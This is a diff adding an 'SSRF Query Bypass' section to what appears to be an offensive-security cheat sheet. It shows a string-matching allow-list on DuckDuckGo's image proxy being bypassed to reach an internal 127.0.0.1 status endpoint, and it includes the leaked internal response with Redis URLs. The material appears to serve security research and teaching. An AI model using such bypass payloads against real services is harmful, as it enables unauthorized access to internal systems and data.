@@ -855,6 +855,42 @@ GET http://example.com
 Referer:localhost
 ```
 
+**SSRF Query Bypass**
+Default State
+```http
+// ACCEPTED REQUEST
+// Allowed because "yimg.com" is in the string i.e. server only checks for the string
+GET /iu/?u=http://yimg.com
+Host: duckduckgo.com
+
+// REJECTED REQUEST //
+// Rejected because "yimg.com" doesn't exist in the string.
+GET /iu/?u=http://google.com
+Host: duckduckgo.com
+```
+
+SSRF with query bypass
+```http
+// REQUEST
+GET /iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com
+
+// RESPONSE
+{
+  "current_time": "2018-08-23T17:56:06",
+  "deployment_environment": "prod",
+  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
+  "redis_local_url": "redis://127.0.0.1:6380",
+  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
+  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
+  "stat_blocked_ips_removed_since_launch": 8787,
+  "stat_blocked_ips_since_launch": 12185,
+  "stat_ipset_blocks": 266,
+  "stat_redis_local_messages_received": 3613,
+  "stat_redis_regional_messages_received": 10211,
+  "status": "up"
+}
+```
+
 ### ============================================================
 ### Amazon Web Services SSRF
 ### ============================================================
